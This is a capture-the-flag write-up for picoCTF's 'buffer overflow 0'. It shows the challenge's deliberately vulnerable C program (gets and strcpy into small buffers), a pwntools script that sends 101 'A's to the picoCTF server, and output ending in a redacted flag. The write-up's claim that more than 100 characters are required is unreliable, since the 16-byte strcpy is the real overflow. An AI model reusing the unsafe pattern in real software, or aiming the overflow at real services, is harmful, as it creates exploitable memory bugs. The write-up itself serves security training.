# PicoCTF - buffer overflow 0

## Challenge Overview
**Title:** buffer overflow 0  
**Category:** Binary Exploitation  
**Difficulty:** Medium  
**Files Provided:** vuln.c, vuln

## Description
Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Connect using: nc saturn.picoctf.net 55750

## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}

```

## Analysis
We see that the program defines a **custom handler** for when a **SEGFAULT** happens.  
```c
void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}
```
**Buffer overflows** cause **SEGFAULT**, so we need to overflow a buffer.

The program stores our input into a **buffer** of size **100**.  
But, it uses `gets()` which **doesn't protect** our buffer from an **overflow** meaning it **leads** to a **SEGFAULT**.  
So we simply need to **enter** an input **larger** than **100** characters.  

**NOTE:** Our input is copied in a smaller buffer of size 16 inside `vuln`. It uses `strcpy` which is also unsafe and will allow an overflow to happen.

To automate the process, I have written a Python script using `pwntools`.
### Python Script
```python
from pwn import *

# Connect to the remote server
host = 'saturn.picoctf.net'
port = 53046
conn = remote(host, port)

print(conn.recv())
conn.sendline(b'A'*101)

# Receive the server's response
response = conn.recvline()
print(response)

# Close the connection
conn.close()
```
```
$ python script.py
[+] Opening connection to saturn.picoctf.net on port 53046: Done
b'Input: '
b'picoCTF{____REDACTED____}\n'
[*] Closed connection to saturn.picoctf.net port 53046
```
## Solution

- Enter an input larger than 100

### Execution Example:
```
$ nc saturn.picoctf.net 53046
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{____REDACTED____}
```